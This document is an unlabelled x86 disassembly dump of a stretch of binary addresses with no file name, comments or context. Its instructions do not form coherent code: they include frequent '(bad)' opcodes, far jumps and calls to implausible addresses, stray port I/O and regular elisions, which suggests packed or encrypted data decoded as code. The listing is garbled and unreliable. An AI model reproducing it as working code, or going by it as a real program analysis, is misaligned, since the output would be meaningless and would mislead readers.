  40be4b:	dec    BYTE PTR [ebx+0xbf88ef]
	...
  40be61:	add    BYTE PTR [eax],al
  40be63:	add    BYTE PTR [esi+eax*1+0x371d548b],ch
  40be6a:	imul   eax,DWORD PTR [eax],0xff6ae7a3
  40be70:	cmp    ah,bh
  40be72:	add    bh,bh
  40be74:	mov    edi,ss
  40be76:	push   0x7f8feff
  40be7b:	push   0x39
  40be7d:	add    DWORD PTR [eax+ebp*8],eax
  40be80:	xchg   edx,eax
  40be81:	adc    al,0x4
  40be83:	add    cl,cl
  40be85:	pop    ebp
  40be86:	pop    eax
  40be87:	cld    
  40be88:	sar    DWORD PTR [eax-0x5fc6ffb4],1
  40be8e:	ror    BYTE PTR [edi],0x39
  40be91:	pushf  
  40be92:	mov    ebx,ebp
  40be94:	(bad)  
  40be95:	mov    bl,0xa
  40be97:	inc    DWORD PTR [edi+ecx*8-0x16]
  40be9b:	push   edx
  40be9c:	xor    DWORD PTR [esi-0x22],ecx
  40be9f:	(bad)  
  40bea0:	and    al,0xd3
  40bea2:	jmp    0x99d1:0x2e6f497
  40bea9:	imul   eax,ebx,0x582de901
  40beaf:	or     al,0x8e
  40beb1:	call   FWORD PTR [ebx-0x5eb06105]
  40beb7:	fidivr WORD PTR [edi-0x24]
  40beba:	fwait
  40bebb:	div    DWORD PTR [edi+0x52]
  40bebe:	stc    
  40bebf:	fsubrp st(5),st
  40bec1:	not    DWORD PTR [eax]
  40bec3:	popa   
  40bec4:	loope  0x40bea2
  40bec6:	std    
  40bec7:	retf   
	...
  40bedc:	js     0x40bed1
  40bede:	call   0xee2c811b
  40bee3:	push   edi
  40bee4:	inc    ecx
  40bee5:	fstp   QWORD PTR [ebx-0x4]
  40bee8:	pop    esi
  40bee9:	stc    
  40beea:	pusha  
  40beeb:	fnstsw WORD PTR [edi]
  40beed:	fcomp  QWORD PTR [ebx+0x10]
  40bef0:	and    DWORD PTR [esi+0x4039041c],ecx
  40bef6:	sbb    ebp,ebx
  40bef8:	lods   eax,DWORD PTR ds:[esi]
  40bef9:	or     al,0xbe
  40befb:	push   edi
  40befc:	inc    ecx
  40befd:	call   0xdc571af3
  40bf02:	lods   eax,DWORD PTR ds:[esi]
  40bf03:	push   edi
  40bf04:	and    eax,0x7f41bdb
  40bf09:	push   esi
  40bf0a:	add    esp,ebp
  40bf0c:	dec    ebp
  40bf0d:	pop    eax
  40bf0e:	xchg   esi,eax
  40bf0f:	fld    QWORD PTR [ecx]
  40bf11:	mov    edi,0x878403f4
  40bf16:	xchg   esp,eax
  40bf17:	cmp    edx,0xffffffb4
  40bf1a:	jns    0x40bef9
  40bf1c:	(bad)  
  40bf1e:	sti    
  40bf1f:	sti    
  40bf20:	lds    eax,FWORD PTR [ebp-0x24302018]
  40bf26:	mov    eax,0x51084ddc
  40bf2b:	mov    esi,0xdd55dbbc
  40bf30:	sub    eax,0xae875bf8
  40bf35:	rol    DWORD PTR [ebp-0x23],cl
  40bf38:	neg    dl
  40bf3a:	mov    bl,0xf
  40bf3c:	sahf   
  40bf3d:	push   ebp
  40bf3e:	add    cl,ah
	...
  40bf54:	mov    ds:0x6c2efeef,al
  40bf59:	imul   eax,DWORD PTR [eax],0xff683a93
  40bf5f:	jmp    0xd43d:0x6c8d003a
  40bf66:	dec    BYTE PTR [esi]
  40bf68:	and    eax,0xe06ff66
  40bf6d:	lock imul ebp,ecx,0x5be7ffd0
  40bf74:	jmp    0xb666bf78
  40bf79:	jmp    0x40bf6d
  40bf7b:	out    0x65,al
  40bf7d:	or     eax,DWORD PTR [eax]
  40bf7f:	jmp    0xddc582be
  40bf84:	or     edx,ebx
  40bf86:	(bad)  
  40bf87:	jmp    0x40bfc3
  40bf89:	add    BYTE PTR [eax],al
  40bf8b:	scas   al,BYTE PTR es:[edi]
  40bf8c:	mov    edi,0xfdbef2d2
  40bf91:	(bad)  
  40bf93:	jmp    0xadc582d2
  40bf98:	jmp    0x3b2abe76
  40bf9d:	add    BYTE PTR [eax],al
  40bf9f:	jb     0x40bfe8
  40bfa1:	clc    
  40bfa2:	mov    bh,bl
  40bfa4:	pusha  
  40bfa5:	add    BYTE PTR [ebp-0x131f59c],cl
  40bfab:	xchg   BYTE PTR [edx],ch
  40bfad:	lea    eax,[ebp+ecx*4+0x19feda09]
  40bfb4:	mov    BYTE PTR [ebx+0x7ae7],0x0
	...
  40bfcb:	add    ch,ch
  40bfcd:	(bad)  [edi+0x66]
  40bfd0:	outs   dx,DWORD PTR ds:[esi]
  40bfd1:	lock (bad) 
  40bfd3:	aam    0x2e
  40bfd5:	(bad)  [ecx+eiz*8+0x20]
  40bfd9:	add    bh,bh
  40bfdb:	aam    0xb2
  40bfdd:	fst    DWORD PTR [ecx+0x0]
  40bfe0:	aam    0x7f
  40bfe2:	mov    ebx,0xfdbc63e8
  40bfe7:	add    BYTE PTR [edi-0x5ffee57e],bl
  40bfed:	inc    BYTE PTR [edx-0x24fd343]
  40bff3:	call   DWORD PTR [eax+0x610f840b]
  40bff9:	(bad)  
  40bffa:	inc    esi
  40bffc:	aad    0x92
  40bffe:	icebp  
  40bfff:	(bad)  
  40c000:	aas    
  40c001:	(bad)  
  40c002:	(bad)  
  40c003:	out    dx,al
  40c004:	push   ds
  40c005:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40c007:	inc    ecx
  40c008:	mov    eax,ds:0x60858cfe
  40c00d:	mov    edx,0xec00fffd
  40c012:	adc    cl,BYTE PTR [eax+edx*2-0x2]
  40c016:	test   al,al
  40c018:	xchg   esp,eax
  40c019:	inc    edx
  40c01a:	mov    DWORD PTR [ebp-0x24e1c],0xbeeefe11
  40c024:	mov    BYTE PTR [edi+edi*1+0x41],bh
  40c028:	and    BYTE PTR [ecx-0x4a23ff7d],cl
  40c02e:	std    
  40c02f:	push   eax
	...
  40c044:	test   al,0xaf
  40c046:	dec    ecx
  40c047:	add    BYTE PTR [eax],dl
  40c049:	cmp    DWORD PTR [esi-0x7c40fc8c],0xfdb5d3d4
  40c053:	add    dl,al
  40c055:	out    0xbc,al
  40c057:	push   0x4143c0
  40c05c:	pop    ebp
  40c05d:	jg     0x40c05d
  40c05f:	sti    
  40c060:	pop    edi
  40c061:	mov    ch,0x4e
  40c063:	call   0x41096e
  40c068:	push   ebp
  40c069:	les    ecx,FWORD PTR ds:0x3863985
  40c06f:	add    BYTE PTR [ecx],bh
  40c071:	mov    edi,0xe6f840de
  40c076:	xchg   DWORD PTR [ecx+edi*1-0x160124ed],eax
  40c07d:	ds mov bl,0x4b
  40c080:	cmp    edi,esp
  40c082:	or     eax,0x85780dc0
  40c087:	cmp    al,0x4e
  40c089:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c08a:	inc    ebx
  40c08b:	add    BYTE PTR [ecx],bh
  40c08d:	loop   0x40c10d
  40c08f:	cmp    BYTE PTR [ecx],0xe7
  40c092:	add    bh,bh
  40c094:	lods   al,BYTE PTR ds:[esi]
  40c095:	out    dx,eax
  40c096:	(bad)  
  40c097:	(bad)  
  40c098:	pop    esi
  40c099:	push   0xffffff81
  40c09b:	fisttp WORD PTR [edx-0x2e]
  40c09e:	fsin   
  40c0a0:	test   bl,bl
  40c0a2:	aad    0xfe
  40c0a4:	inc    esi
  40c0a5:	push   edx
  40c0a6:	and    bl,0x0
	...
  40c0b9:	add    BYTE PTR [eax],al
  40c0bb:	add    BYTE PTR [edx-0x46],cl
  40c0be:	(bad)  [esp+edi*4+0x2efed58e]
  40c0c5:	pop    ss
  40c0c6:	outs   dx,BYTE PTR ds:[esi]
  40c0c7:	add    DWORD PTR [ebx-0x6cff9319],edx
  40c0cd:	out    0x6c,eax
  40c0cf:	add    ah,al
  40c0d1:	imul   esp,ebx,0xfffffff2
  40c0d4:	push   cs
  40c0d5:	stos   BYTE PTR es:[edi],al
  40c0d6:	xor    bh,bh
  40c0d8:	sub    al,0xb2
  40c0da:	inc    esp
  40c0db:	inc    ecx
  40c0dc:	cmp    esi,ecx
  40c0de:	ret    0x7e73
  40c0e1:	jb     0x40c132
  40c0e3:	adc    al,0xee
  40c0e5:	xor    edi,DWORD PTR [ebx-0x267e190e]
  40c0eb:	mov    ah,0xfd
  40c0ed:	push   ebp
  40c0ee:	(bad)  
  40c0f0:	(bad)  
  40c0f1:	fcomi  st,st(2)
  40c0f3:	inc    BYTE PTR [edx+esi*2-0x39012b]
  40c0fa:	push   eax
  40c0fb:	fidivr WORD PTR [ebp-0x1225a228]
  40c101:	mov    ebx,0xe7afda59
  40c106:	cs dec ebp
  40c108:	cmp    DWORD PTR [eax],eax
  40c10a:	push   edx
  40c10b:	clc    
  40c10c:	lahf   
  40c10d:	push   edx
  40c10e:	aad    0xda
  40c110:	int    0xe7
  40c112:	cmp    edx,ebx
  40c114:	(bad)  
  40c115:	fdiv   DWORD PTR [ebx-0x19]
  40c118:	mov    ebx,eax
  40c11a:	and    eax,0x1df005da
  40c11f:	nop
	...
  40c134:	mov    cl,ah
  40c136:	adc    eax,0xbae56da
  40c13b:	fisub  DWORD PTR [edi-0x28]
  40c13e:	cmp    esp,edi
  40c140:	imul   ebx,eax,0xfffffffd
  40c143:	jmp    0xbd80:0x3e9446a
  40c14a:	aam    0x3
  40c14c:	in     al,dx
  40c14d:	test   ah,dl
  40c14f:	test   DWORD PTR [edx-0x69],edi
  40c152:	xor    eax,0x61ec8d8d
  40c157:	idiv   BYTE PTR [ebp-0x6ccb6ec3]
  40c15d:	add    dh,al
  40c15f:	dec    edi
  40c160:	sub    eax,0xa30c33d7
  40c165:	add    BYTE PTR [esi+0x1ad7254f],dh
  40c16b:	xor    BYTE PTR [eax+eax*8+0x3df6301b],bh
  40c172:	pop    ebp
  40c173:	add    al,0x39
  40c175:	add    cl,ch
  40c177:	mov    WORD PTR [ebp-0x4a099e68],es
  40c17d:	cmp    eax,0x3dac3445
  40c182:	test   eax,0xfff06334
  40c187:	jne    0x40c207
  40c189:	cwde   
  40c18a:	(bad)  
  40c18b:	sbb    esi,DWORD PTR [ecx]
  40c18d:	cmp    DWORD PTR [ebp+eiz*4+0x35],0x4c
  40c192:	daa    
  40c193:	ins    BYTE PTR es:[edi],dx
  40c194:	push   cs
  40c195:	sar    dh,0xdc
	...
  40c1ac:	sahf   
  40c1ad:	(bad)  
  40c1ae:	je     0x40c1a9
  40c1b0:	or     DWORD PTR [esi],0xd736bcff
  40c1b6:	je     0x40c1a9
  40c1b8:	mov    ds:0x7036fcb3,al
  40c1bd:	(bad)  
  40c1be:	ss inc ecx
  40c1c0:	push   ds
  40c1c1:	dec    ebx
  40c1c2:	add    cl,ch
  40c1c4:	mov    ch,0xbe
  40c1c6:	add    ebx,DWORD PTR [esi]
  40c1c8:	(bad)  
  40c1c9:	xchg   ebx,eax
  40c1ca:	je     0x40c203
  40c1cc:	pop    esp
  40c1cd:	mov    cs,WORD PTR [edx+0x118ac2b4]
  40c1d3:	push   es
  40c1d4:	out    dx,al
  40c1d5:	xchg   edi,eax
  40c1d6:	(bad)  
  40c1d7:	fwait
  40c1d8:	inc    edx
  40c1d9:	aaa    
  40c1da:	leave  
  40c1db:	sub    eax,DWORD PTR [ebp-0x29]
  40c1de:	push   ebx
  40c1df:	bound  edx,QWORD PTR [ecx-0x80]
  40c1e2:	ret    
  40c1e3:	loope  0x40c245
  40c1e5:	(bad)  
  40c1e6:	(bad)  
  40c1e7:	les    ebp,FWORD PTR ss:[ebx]
  40c1ea:	adc    BYTE PTR [edx+0x24],ah
  40c1ed:	test   BYTE PTR [ecx+edx*8+0x19fed600],al
  40c1f4:	pop    DWORD PTR [eax]
  40c1f6:	push   DWORD PTR [eax*2+0x7fb6006a]
  40c1fd:	lock (bad) 
  40c1ff:	sbb    esp,DWORD PTR [ecx]
  40c201:	jge    0x40c1c2
  40c203:	sbb    al,0x98
  40c205:	mov    edi,0xd6109d84
  40c20a:	(bad)  
  40c20b:	jmp    0x6240c24a
	...
  40c224:	push   edi
  40c225:	iret   
  40c226:	std    
  40c227:	add    BYTE PTR [edi+0x651289b7],dh
  40c22d:	push   esi
  40c22e:	sti    
  40c22f:	inc    BYTE PTR [edi-0x48]
  40c232:	dec    esi
  40c233:	lea    ebx,[ebp+0x3]
  40c236:	(bad)  
  40c237:	call   DWORD PTR [edi+0x13]
  40c23a:	push   0x10
  40c23c:	pop    ss
  40c23d:	xchg   dh,dh
  40c23f:	inc    BYTE PTR [edi]
  40c241:	mov    eax,0x7b8452fd
  40c246:	mov    ebx,0xfdb7f6fc
  40c24b:	add    ah,cl
  40c24d:	sbb    al,0x8d
  40c24f:	mov    ebp,0xfffdb7a0
  40c254:	push   edi
  40c255:	inc    esi
  40c256:	adc    bh,bh
  40c258:	popf   
  40c259:	(bad)  
  40c25a:	push   esi
  40c25b:	dec    ebp
  40c25d:	or     ch,al
  40c25f:	adc    eax,DWORD PTR [edi-0x48]
  40c262:	std    
  40c263:	sbb    DWORD PTR [edi],0xffffffd3
  40c266:	std    
  40c267:	lea    esi,[ecx+edi*4]
  40c26a:	std    
  40c26b:	dec    ebp
  40c26d:	loopne 0x40c258
  40c26f:	stos   BYTE PTR es:[edi],al
  40c270:	(bad)  [ebp-0x9]
  40c273:	(bad)  
  40c274:	push   edi
  40c275:	scas   al,BYTE PTR es:[edi]
  40c276:	mov    DWORD PTR [edx],edx
  40c278:	push   edi
  40c279:	jo     0x40c271
  40c27b:	(bad)  
  40c27c:	pop    ss
  40c27d:	scas   al,BYTE PTR es:[edi]
  40c27e:	std    
  40c27f:	push   edx
  40c280:	sbb    BYTE PTR [edi],cl
  40c282:	leave  
  40c283:	ret    0x204
  40c286:	push   ebp
  40c287:	mov    eax,DWORD PTR [eax]
	...
  40c299:	add    BYTE PTR [eax],al
  40c29b:	add    BYTE PTR [esp+edi*2],al
  40c29e:	ret    0xd6f8
  40c2a1:	lods   eax,DWORD PTR ds:[esi]
  40c2a2:	std    
  40c2a3:	push   edi
  40c2a4:	fwait
  40c2a5:	(bad)  
  40c2a7:	mov    esp,edx
  40c2a9:	mov    BYTE PTR [ebx-0x2522908],al
  40c2af:	push   eax
  40c2b0:	dec    edx
  40c2b1:	cld    
  40c2b2:	imul   eax,DWORD PTR [eax],0xc506e39
  40c2b8:	out    0x19,al
  40c2ba:	sbb    al,0x85
  40c2bc:	stc    
  40c2bd:	aam    0x35
  40c2bf:	(bad)  
  40c2c0:	jl     0x40c315
  40c2c2:	add    al,0x0
  40c2c4:	cmp    edi,esp
  40c2c6:	jb     0x40c252
  40c2c8:	lods   al,BYTE PTR ds:[esi]
  40c2c9:	dec    edi
  40c2ca:	(bad)  
  40c2cb:	(bad)  
  40c2cc:	mov    esi,0xfc8cf252
  40c2d1:	xor    dh,BYTE PTR [ecx*4-0x129d44c]
  40c2d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2d9:	xchg   edi,eax
  40c2da:	push   0xdc549e10
  40c2df:	std    
  40c2e0:	xchg   esi,eax
  40c2e1:	push   ss
  40c2e2:	xlat   BYTE PTR ds:[ebx]
  40c2e3:	push   ecx
  40c2e4:	cmp    eax,0x857c8337
  40c2e9:	out    0x72,eax
  40c2eb:	jae    0x40c346
  40c2ed:	dec    esp
  40c2ee:	cdq    
  40c2ef:	sti    
  40c2f0:	ja     0x40c2e8
  40c2f2:	(bad)  
  40c2f3:	(bad)  
  40c2f4:	outs   dx,BYTE PTR ds:[esi]
  40c2f5:	je     0x40c2fd
  40c2f7:	(bad)  
  40c2f8:	in     al,dx
  40c2f9:	fisubr WORD PTR ds:0xd6fe31e8
  40c2ff:	inc    BYTE PTR [eax]
	...
  40c311:	add    BYTE PTR [eax],al
  40c313:	add    BYTE PTR [edx+0x4e8ff41e],bh
  40c319:	pushf  
  40c31a:	(bad)  
  40c31b:	(bad)  
  40c31c:	int3   
  40c31d:	push   DWORD PTR [ebx-0x16]
  40c320:	mov    edx,DWORD PTR [edx+0x70]
  40c323:	div    DWORD PTR [edi]
  40c325:	mov    dh,0xd5
  40c327:	mov    cl,BYTE PTR [ebx-0x52]
  40c32a:	(bad)  
  40c32b:	mul    DWORD PTR [edi]
  40c32d:	(bad)  
  40c32e:	aad    0xfe
  40c330:	mov    ecx,edi
  40c332:	xor    eax,0x2cefbc9
  40c337:	push   ebp
  40c338:	ret    0x81ba
  40c33b:	ret    
  40c33c:	leave  
  40c33d:	in     al,dx
  40c33e:	(bad)  
  40c33f:	je     0x40c36e
  40c341:	add    BYTE PTR [ecx-0x16ff7e34],dl
  40c347:	or     bh,cl
  40c349:	dec    edx
  40c34a:	in     al,dx
  40c34b:	xor    eax,0x3dcc1f0
  40c350:	or     al,ah
  40c352:	imul   eax,ebx,0x88988938
  40c358:	jne    0x40c33e
  40c35a:	sbb    BYTE PTR [edx],dh
  40c35c:	(bad)  
  40c35d:	dec    edx
  40c35e:	fucomp st(3)
  40c360:	pop    edx
  40c361:	xchg   BYTE PTR [ebp-0x2a],ah
  40c364:	arpl   di,ax
  40c366:	outs   dx,DWORD PTR ds:[esi]
  40c367:	dec    eax
  40c368:	test   eax,ebp
  40c36a:	loop   0x40c379
  40c36c:	mov    fs,WORD PTR ss:[esp+ebp*1-0x50540173]
  40c374:	stc    
  40c375:	cmp    BYTE PTR [edi],0xef
	...
  40c38c:	or     bh,cl
  40c38e:	add    esi,ecx
  40c390:	mov    cl,0x4a
  40c392:	sbb    edx,ebp
  40c394:	push   esi
  40c395:	push   cs
  40c396:	test   BYTE PTR [ebp+0x330d25fa],0xe1
  40c39d:	push   0x833944ab
  40c3a2:	mov    ds:0x14e7eebb,eax
  40c3a7:	dec    esp
  40c3a8:	cmp    DWORD PTR [eax],eax
  40c3aa:	push   0xffffffbf
  40c3ac:	inc    edx
  40c3ad:	sub    DWORD PTR [ebx+0x73d4f6bb],0xffffffb3
  40c3b4:	push   esi
  40c3b5:	xchg   DWORD PTR [ecx-0x2b],esp
  40c3b8:	aaa    
  40c3b9:	mov    ah,BYTE PTR [ebx]
  40c3bb:	mov    ah,0x74
  40c3bd:	jg     0x40c395
  40c3bf:	lock test al,0xaf
  40c3c2:	addr16 pop edi
  40c3c4:	add    eax,0x3903e8d4
  40c3c9:	shl    DWORD PTR [ebx],cl
  40c3cb:	mov    al,0x96
  40c3cd:	add    BYTE PTR [bp+di],ch
  40c3d0:	jp     0x40c3d2
  40c3d2:	lea    esp,[edi*4-0x7d9a17bd]
  40c3d9:	add    BYTE PTR [eax],al
  40c3db:	push   0xfffffff9
  40c3dd:	pop    es
  40c3de:	lea    ebp,[eiz*4-0x5aeb00bd]
  40c3e5:	fist   DWORD PTR [edi+0x2]
  40c3e8:	in     al,dx
  40c3e9:	ror    BYTE PTR [eax+0x44848524],cl
  40c3ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  40c404:	or     eax,0x4d9974d3
  40c409:	push   eax
  40c40a:	inc    edx
  40c40b:	test   al,0x3a
  40c40d:	shl    DWORD PTR [esp+edx*8],cl
  40c410:	arpl   WORD PTR [ecx+0x0],ax
  40c413:	inc    ecx
  40c414:	sbb    BYTE PTR [esi-0x1],dl
  40c417:	dec    esi
  40c418:	xor    al,al
  40c41a:	push   cs
  40c41b:	ins    DWORD PTR es:[edi],dx
  40c41c:	and    al,0xd3
  40c41e:	(bad)  
  40c41f:	jmp    0x6b0900e7
  40c424:	out    dx,al
  40c425:	ret    
  40c426:	(bad)  
  40c427:	(bad)  
  40c429:	cmp    bh,0xe8
  40c42c:	cmp    dl,bl
  40c42e:	je     0x40c41d
  40c430:	(bad)  
  40c431:	dec    DWORD PTR [eax-0x17]
  40c434:	cmp    dh,BYTE PTR [ecx+0x1756adf]
  40c43a:	mov    DWORD PTR [edx+ebp*4-0x4a128b2e],ebp
  40c441:	cmp    al,0xb4
  40c443:	div    bh
  40c445:	ret    
  40c446:	mov    fs,WORD PTR [edx+edi*2-0x424e8b2e]
  40c44d:	cmp    eax,esp
  40c44f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c450:	outs   dx,DWORD PTR ds:[esi]
  40c451:	xchg   esp,eax
  40c452:	(bad)  
  40c453:	call   0xcc3c492
  40c458:	dec    esp
  40c459:	sub    DWORD PTR [ecx+0x0],eax
  40c45c:	and    bh,bh
  40c45e:	jae    0x40c4b0
  40c460:	popf   
  40c461:	adc    bh,BYTE PTR [eax+0x69ff7a50]
	...
  40c47b:	add    BYTE PTR [edx-0x4],bh
  40c47e:	mov    WORD PTR [ebp-0x70],es
  40c481:	punpckhdq mm0,QWORD PTR [eax]
  40c484:	pop    ebp
  40c485:	adc    al,al
  40c487:	push   eax
  40c488:	iret   
  40c489:	loope  0x40c4e0
  40c48b:	sub    DWORD PTR [ecx],edx
  40c48d:	cld    
  40c48e:	or     al,al
  40c490:	aam    0xf0
  40c492:	cmp    BYTE PTR [ebp+0xc],0xff
  40c496:	jae    0x40c4c4
  40c498:	push   ebx
  40c499:	sub    dl,BYTE PTR [eax]
  40c49b:	add    ah,al
  40c49d:	push   es
  40c49e:	mov    edx,DWORD PTR [ebp-0x50]
  40c4a1:	xor    al,0xc7
  40c4a3:	add    cl,BYTE PTR [edi-0x4]
  40c4a6:	(bad)  
  40c4a7:	jne    0x40c441
  40c4a9:	stos   DWORD PTR es:[edi],eax
  40c4aa:	jae    0x40c464
  40c4ac:	out    dx,eax
  40c4ad:	inc    ecx
  40c4ae:	mov    esp,0x67fad5ff
  40c4b3:	add    esp,DWORD PTR [eax-0xb174325]
  40c4b9:	mov    eax,0x424ffffd
  40c4be:	mov    esp,0x142ae8
  40c4c3:	add    BYTE PTR [edi+0x42],cl
  40c4c6:	enter  0xfce8,0x44
  40c4ca:	(bad)  
  40c4cb:	jmp    FWORD PTR [edi]
  40c4cd:	inc    edx
  40c4ce:	shr    al,1
  40c4d0:	add    al,0x45
  40c4d2:	(bad)  
  40c4d3:	jmp    FWORD PTR [esi+0x500cc0c5]
  40c4d9:	and    DWORD PTR [ebx-0x396d2c14],ecx
  40c4df:	lea    eax,[eax]
	...
  40c4f1:	add    BYTE PTR [eax],al
  40c4f3:	add    BYTE PTR [ebp-0x50],ah
  40c4f6:	dec    esi
  40c4f7:	push   0x413a57
  40c4fc:	cmp    DWORD PTR ds:0x3f396a09,edi
  40c502:	sbb    eax,DWORD PTR [edx+0x78]
  40c505:	out    0xda,eax
  40c507:	mov    ebp,0x8502e781
  40c50c:	stc    
  40c50d:	fidivr DWORD PTR [edx-0x41]
  40c510:	cmp    edi,esp
  40c512:	add    cl,BYTE PTR [ebx+0x117e9b8c]
  40c518:	mov    esp,0xe64fcc1c
  40c51d:	hlt    
  40c51e:	iret   
  40c51f:	dec    BYTE PTR [ebx+0x46bf87e3]
  40c525:	dec    edi
  40c526:	jb     0x40c527
  40c528:	into   
  40c529:	out    0x85,eax
  40c52b:	jl     0x40c4ee
  40c52d:	out    0x1,eax
  40c52f:	test   BYTE PTR [ebp+0x7e0002e7],ah
  40c535:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c536:	mov    dh,0xff
  40c538:	scas   al,BYTE PTR es:[edi]
  40c539:	out    0x2,eax
  40c53b:	(bad)  
  40c53c:	cld    
  40c53d:	push   cs
  40c53e:	add    al,0x0
  40c540:	cmp    edi,esp
  40c542:	leave  
  40c543:	inc    esp
  40c544:	imul   ebp,edi,0x1a390003
  40c54a:	dec    ecx
  40c54b:	int3   
  40c54c:	cmp    edi,esp
  40c54e:	add    al,BYTE PTR [eax]
  40c550:	mov    dl,0x6c
  40c552:	retf   0x4b8a
  40c555:	dec    esp
  40c556:	dec    ecx
  40c557:	int3   
	...
  40c56c:	or     DWORD PTR [ecx+ecx*2-0x30],esp
  40c570:	or     DWORD PTR [ebp+0x3],edi
  40c573:	jmp    esp
  40c575:	out    dx,al
  40c576:	rcl    BYTE PTR [ecx+0x45],cl
  40c579:	into   
  40c57a:	ret    0xe574
  40c57d:	gs push ecx
  40c57f:	int3   
  40c580:	cmp    BYTE PTR [ecx+eax*2-0x7d],dl
  40c584:	mov    esp,0x7f7403ea
  40c589:	add    BYTE PTR [ecx+0x6b],dl
  40c58c:	jnp    0x40c5cd
  40c58e:	jmp    0xc0ed7365
  40c593:	enter  0x76,0xe9
  40c597:	(bad)  
  40c598:	(bad)  
  40c599:	dec    ebx
  40c59a:	repz imul esi,esi,0xb003e8ff
  40c5a1:	cmp    ah,BYTE PTR [ecx+0x23b937de]
  40c5a7:	mov    esp,0x3e8d0f6
  40c5ac:	out    dx,al
  40c5ad:	dec    edx
  40c5ae:	mov    cl,0xd2
  40c5b0:	ins    DWORD PTR es:[edi],dx
  40c5b1:	lods   al,BYTE PTR ds:[esi]
  40c5b2:	xchg   ebp,eax
  40c5b3:	pop    eax
  40c5b4:	xor    eax,ebp
  40c5b6:	xchg   al,dl
  40c5b8:	xlat   BYTE PTR ds:[ebx]
  40c5b9:	rol    BYTE PTR [ebp-0x29181aa8],1
  40c5bf:	cmp    edi,DWORD PTR [ecx]
  40c5c1:	add    BYTE PTR [edx+0x50],ch
  40c5c4:	loope  0x40c5c5
  40c5c6:	hlt    
  40c5c7:	sti    
  40c5c8:	mov    bh,0x4a
  40c5ca:	inc    ecx
  40c5cb:	(bad)  [esi]
  40c5cd:	dec    eax
  40c5ce:	jmp    0x40c5d6
	...
  40c5e3:	add    BYTE PTR [edx-0x5ec79e7d],dl
  40c5e9:	test   dl,bh
  40c5eb:	ror    BYTE PTR ds:0x413545d8,cl
  40c5f1:	test   DWORD PTR [ebx+0x35edb3cf],edx
  40c5f7:	pop    eax
  40c5f8:	jge    0x40c5ca
  40c5fa:	call   0x403:0xecbd81fb
  40c601:	test   DWORD PTR [esi+eax*4],ecx
  40c604:	jp     0x40c5e5
  40c606:	mov    esi,0xaaa51d86
  40c60b:	inc    esp
  40c60c:	cmp    DWORD PTR [eax],eax
  40c60e:	jl     0x40c601
  40c610:	ja     0x40c60c
  40c612:	push   ecx
  40c613:	inc    ebp
  40c614:	clc    
  40c615:	(bad)  
  40c616:	jmp    edi
  40c618:	cmp    al,BYTE PTR [eax]
  40c61a:	add    BYTE PTR [edi],ch
  40c61c:	fild   DWORD PTR [ecx+0x41]
  40c61f:	jmp    0xa8a6cd31
  40c624:	push   ebx
  40c625:	add    al,BYTE PTR [ebx-0x7c99c851]
  40c62b:	(bad)  
  40c62d:	push   ebp
  40c62e:	repz push 0x3e
  40c631:	out    0x2d,eax
  40c633:	sub    BYTE PTR ds:0xec6d0f00,bh
  40c639:	iret   
  40c63a:	(bad)  
  40c63b:	jmp    0xd823d2fd
  40c640:	jnp    0x40c642
  40c642:	add    dh,ch
  40c644:	mov    esi,0xe8ffdd
	...
  40c659:	add    BYTE PTR [eax],al
  40c65b:	add    BYTE PTR [edx],bh
  40c65d:	cmp    DWORD PTR [esi+esi*1],0x32
  40c661:	inc    ecx
  40c662:	add    cl,ch
  40c664:	cmp    DWORD PTR [eax+eiz*8-0x38ffc517],eax
  40c66b:	sub    al,0xe9
  40c66d:	iret   
  40c66e:	(bad)  
  40c66f:	jmp    0x61858dae
  40c674:	xor    eax,0x27e90000
  40c679:	inc    esp
  40c67a:	cld    
  40c67b:	mov    ecx,0xb9f8441f
  40c680:	hlt    
  40c681:	jmp    DWORD PTR [edi+0x40]
  40c684:	test   DWORD PTR [eax+0x0],0x2de28e3e
  40c68b:	test   al,0x3a
  40c68d:	sti    
  40c68e:	mov    edi,0xff95bede
  40c693:	call   0x21bd49d2
  40c698:	cmp    eax,0x354583ff
  40c69d:	add    BYTE PTR [eax],al
  40c69f:	push   0x6
  40c6a1:	int3   
  40c6a2:	(bad)  
  40c6a3:	inc    DWORD PTR [edi-0x79]
  40c6a6:	mov    al,ds:0x8b035000
  40c6ab:	jne    0x40c6f1
  40c6ad:	stos   BYTE PTR es:[edi],al
  40c6ae:	add    BYTE PTR [eax],0x20
  40c6b1:	add    edx,DWORD PTR [esi-0x75]
  40c6b4:	dec    esi
  40c6b5:	mov    cl,0x74
  40c6b7:	sbb    BYTE PTR [edi+0x7efff046],dl
  40c6bd:	ror    BYTE PTR [ebp+0x45],1
	...
  40c6d3:	add    ah,ch
  40c6d5:	sub    ch,BYTE PTR [edi-0x17fb9ebe]
  40c6db:	xlat   BYTE PTR ds:[ebx]
  40c6dc:	pop    esi
  40c6dd:	add    al,0x0
  40c6df:	shl    eax,1
  40c6e1:	cmp    DWORD PTR [esi-0x1fb9a6fe],0x68
  40c6e8:	xchg   DWORD PTR [ebp+0x41],eax
  40c6eb:	add    BYTE PTR [edi+0x46],dl
  40c6ee:	in     al,0xc7
  40c6f0:	or     eax,0xe0fffee0
  40c6f5:	add    cl,BYTE PTR [ebp+0x6a12a845]
  40c6fb:	add    DWORD PTR [edx],ebp
  40c6fd:	add    al,0x6a
  40c6ff:	add    BYTE PTR [ebp+0x46],dl
  40c702:	loopne 0x40c754
  40c704:	cmp    al,BYTE PTR [ecx*4-0xecefbb]
  40c70b:	adc    eax,0x40e9ef
  40c710:	fwait
  40c711:	ret    0x2d72
  40c714:	and    edi,DWORD PTR [esi]
  40c716:	in     al,dx
  40c717:	add    ah,cl
  40c719:	pop    ss
  40c71a:	mov    eax,0x29001
  40c71f:	or     edx,DWORD PTR [eax+0x37]
  40c722:	push   ss
  40c723:	jmp    FWORD PTR [ebp+0x4875fdca]
  40c729:	mov    al,0x73
  40c72b:	in     al,dx
  40c72c:	inc    edi
  40c72d:	sub    DWORD PTR [eax],ecx
  40c72f:	push   0xef02dd39
  40c734:	xchg   edi,eax
  40c735:	add    bl,bh
  40c737:	clc    
	...
  40c74c:	dec    esi
  40c74d:	add    eax,0xf05574d0
  40c752:	xchg   ebp,eax
  40c753:	inc    esp
  40c754:	cmp    ecx,ebx
  40c756:	xor    bh,bh
